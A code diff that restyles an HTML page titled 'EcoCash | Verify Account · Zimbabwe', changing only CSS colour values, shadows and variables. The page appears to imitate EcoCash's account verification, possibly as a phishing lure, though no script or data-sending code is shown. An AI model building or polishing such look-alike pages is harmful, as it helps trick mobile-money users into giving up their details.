@@ -3,21 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <meta name="theme-color" content="#0052cc">
+    <meta name="theme-color" content="#003d99">
     <title>EcoCash | Verify Account · Zimbabwe</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
             --eco-red: #d32f2f;
-            --eco-blue: #0052cc;
-            --eco-blue-dark: #003d99;
-            --eco-blue-light: #1a73e8;
+            --eco-blue: #003d99;
+            --eco-blue-light: #0052cc;
             --white: #ffffff;
             --light-bg: #f0f4f8;
             --text-dark: #1a1a1a;
             --text-muted: #666666;
             --border: #e0e0e0;
-            --success: #00b050;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -25,7 +23,7 @@
 
         body {
             font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, var(--eco-blue) 0%, var(--eco-blue-dark) 100%);
+            background: linear-gradient(135deg, var(--eco-blue) 0%, #002a6d 100%);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -36,7 +34,7 @@
             background: white;
             padding: 16px 5%;
             border-bottom: 3px solid var(--eco-blue);
-            box-shadow: 0 2px 12px rgba(0, 82, 204, 0.1);
+            box-shadow: 0 2px 12px rgba(0, 61, 153, 0.12);
         }
 
         .logo {
@@ -66,7 +64,7 @@
             padding: 40px;
             max-width: 450px;
             width: 100%;
-            box-shadow: 0 10px 40px rgba(0, 82, 204, 0.2);
+            box-shadow: 0 10px 40px rgba(0, 61, 153, 0.25);
             border: 2px solid var(--eco-blue);
         }
 
@@ -89,7 +87,7 @@
         }
 
         .bundle-info {
-            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
+            background: linear-gradient(135deg, var(--eco-blue), #002a6d);
             border-radius: 12px;
             padding: 16px;
             margin-bottom: 28px;
@@ -140,7 +138,7 @@
         .input-wrapper:focus-within {
             border-color: var(--eco-red);
             background: white;
-            box-shadow: 0 0 0 3px rgba(0, 82, 204, 0.1);
+            box-shadow: 0 0 0 3px rgba(0, 61, 153, 0.1);
         }
 
         .country-code {
@@ -212,7 +210,7 @@
 
         .btn-primary {
             flex: 1;
-            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
+            background: linear-gradient(135deg, var(--eco-blue), #002a6d);
             color: white;
             border: none;
             padding: 14px 20px;
@@ -223,12 +221,12 @@
             letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
-            box-shadow: 0 4px 12px rgba(0, 82, 204, 0.25);
+            box-shadow: 0 4px 12px rgba(0, 61, 153, 0.3);
         }
 
         .btn-primary:hover:not(:disabled) {
             transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(0, 82, 204, 0.35);
+            box-shadow: 0 6px 16px rgba(0, 61, 153, 0.4);
         }
 
         .btn-primary:disabled {
@@ -338,7 +336,7 @@
             padding: 32px;
             max-width: 400px;
             width: 100%;
-            box-shadow: 0 10px 40px rgba(0, 82, 204, 0.2);
+            box-shadow: 0 10px 40px rgba(0, 61, 153, 0.25);
             text-align: center;
             border: 2px solid var(--eco-blue);
         }
@@ -369,14 +367,14 @@
             letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
-            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
+            background: linear-gradient(135deg, var(--eco-blue), #002a6d);
             color: white;
-            box-shadow: 0 4px 12px rgba(0, 82, 204, 0.25);
+            box-shadow: 0 4px 12px rgba(0, 61, 153, 0.3);
         }
 
         .modal-btn:hover {
             transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(0, 82, 204, 0.35);
+            box-shadow: 0 6px 16px rgba(0, 61, 153, 0.4);
         }
 
         @media (max-width: 600px) {
